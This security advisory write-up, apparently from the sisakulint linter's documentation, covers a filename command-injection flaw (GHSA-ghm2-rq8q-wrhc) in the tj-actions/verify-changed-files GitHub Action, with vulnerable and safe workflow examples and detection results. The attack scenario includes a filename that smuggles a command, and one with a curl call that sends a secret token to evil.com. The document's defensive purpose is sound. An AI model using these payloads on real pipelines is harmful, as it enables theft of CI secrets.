# GHSA-ghm2-rq8q-wrhc: Command Injection via Malicious Filenames in tj-actions/verify-changed-files

## Summary

| Field | Value |
|-------|-------|
| **Advisory ID** | GHSA-ghm2-rq8q-wrhc |
| **Package** | tj-actions/verify-changed-files |
| **Severity** | High (CVSS 7.7) |
| **Vulnerability Type** | Command Injection (CWE-20, CWE-77) |
| **Affected Versions** | < 17 |
| **Fixed Version** | 17 |
| **Published** | 2024-01-12 |
| **Advisory URL** | https://github.com/advisories/GHSA-ghm2-rq8q-wrhc |

## Vulnerability Description

The `tj-actions/verify-changed-files` action (versions < 17) is vulnerable to command injection through malicious filenames. The action returns a list of changed files, but filenames containing special characters like `;` and backticks can be exploited when the output is used directly in a `run` block without proper sanitization.

**Technical Details:**
- CVSS Score: 7.7/10 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L)
- CWE-20: Improper Input Validation
- CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)
- EPSS: 0.621% (70th percentile)
- Attack Complexity: High (requires specific workflow configuration)
- Scope Change: Yes - can impact resources beyond the vulnerable component

**Attack Scenario:**
An attacker submits a pull request with a specially crafted filename (e.g., `$(whoami).txt`). When the workflow executes and the filename flows into a step that uses the output directly in bash commands, the injected commands execute on the GitHub Runner. This can lead to arbitrary code execution and potential secret exfiltration, including `GITHUB_TOKEN`, especially when triggered on events other than `pull_request` (e.g., `push`).

**Resolution:**
The fix introduces a `safe_output` input enabled by default that escapes special characters for bash environments. The recommended secure practice is to use environment variables to store outputs rather than direct substitution.

**The Fix (v17):**
- Added `safe_output` input parameter (enabled by default)
- Escapes shell metacharacters before output
- Commits: 498d3f316f501aa72485060e8c96fde7b2014f12, 592e305da041c09a009afa4a43c97d889bed65c3

### Attack Scenario

1. Attacker creates a file with malicious name: `file.txt$(curl http://evil.com?token=$SECRET_TOKEN)`
2. Commits the file and opens a pull request
3. The `pull_request_target` workflow triggers with elevated privileges
4. The action's `changed_files` output includes the malicious filename
5. When the workflow uses this output in a shell command, the injected command executes
6. Secrets can be exfiltrated or repository can be compromised

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  verify-files:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Verify changed files
        id: verify-changed-files
        run: |
          CHANGED_FILES="file1.txt file2.txt"
          echo "changed_files=$CHANGED_FILES" >> "$GITHUB_OUTPUT"

      - name: Process changed files
        run: |
          # Vulnerable: Direct substitution without env variable
          echo "Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}"

          # Vulnerable: Iteration without proper quoting
          for file in ${{ steps.verify-changed-files.outputs.changed_files }}; do
            echo "Processing: $file"
          done
```

### Why This is Vulnerable

- Step outputs with filenames are substituted directly into shell commands
- No quoting or sanitization of filename values
- Shell interprets special characters in filenames as commands
- `pull_request_target` provides elevated privileges for exploitation

## Safe Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  verify-files:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Verify changed files
        id: verify-changed-files
        run: |
          CHANGED_FILES="file1.txt file2.txt"
          echo "changed_files=$CHANGED_FILES" >> "$GITHUB_OUTPUT"

      - name: Process changed files
        env:
          CHANGED_FILES: ${{ steps.verify-changed-files.outputs.changed_files }}
        run: |
          # Safe: Use environment variable
          echo "Changed files: $CHANGED_FILES"

          # Safe: Proper iteration with quoting
          while IFS= read -r file; do
            echo "Processing: $file"
          done <<< "$CHANGED_FILES"
```

### Why This is Safe

- Environment variables prevent shell expansion during assignment
- Proper iteration using `while read` with here-string
- Filenames treated as literal strings
- No shell interpretation of special characters

## Detection in sisakulint

### Expected Rules

- **CodeInjectionCriticalRule** - Should detect direct usage of step outputs containing filenames in shell commands
- **OutputClobberingCriticalRule** - Should detect unsafe output clobbering patterns
- **UntrustedCheckoutRule** - Should detect checkout of untrusted PR code

### sisakulint Detection Result

```
script/actions/advisory/GHSA-ghm2-rq8q-wrhc-vulnerable.yaml:23:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 10). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | untrusted-checkout | Yes |
| Partial | code-injection-critical | No (not for step outputs) |

sisakulint **partially detects** this vulnerability:
1. **UntrustedCheckoutRule** - Successfully detects checkout of untrusted PR code with `pull_request_target` trigger
2. **CodeInjectionCriticalRule** - Does not currently detect step output usage in shell commands (this is a limitation for detecting the specific command injection via malicious filenames pattern)

## Mitigation Strategies

1. **Use Environment Variables** (Recommended)
   - Always pass step outputs through environment variables
   - Prevents shell expansion of special characters

2. **Proper Iteration Techniques**
   - Use `while IFS= read -r` instead of `for` loops
   - Properly quote variables
   - Use here-strings or here-docs for input

3. **Update to Fixed Version**
   - Upgrade to `tj-actions/verify-changed-files@v17.0.0` or later
   - Fixed version properly escapes filenames

4. **Filename Validation**
   - Validate filenames match expected patterns
   - Reject files with suspicious characters
   - Use null-terminated output when possible

## References

- GitHub Advisory: https://github.com/advisories/GHSA-ghm2-rq8q-wrhc
- Repository Security Advisory: https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc
- Security Patch Commits:
  - https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12
  - https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3
- tj-actions/verify-changed-files Repository: https://github.com/tj-actions/verify-changed-files
- CVE: CVE-2023-52137
- CWE-20: Improper Input Validation
- CWE-77: Improper Neutralization of Special Elements used in a Command
- OWASP: Command Injection
- Related sisakulint rules:
  - [Code Injection Rule](../codeinjectionrule.md)
  - [Output Clobbering Rule](../outputclobbering.md)
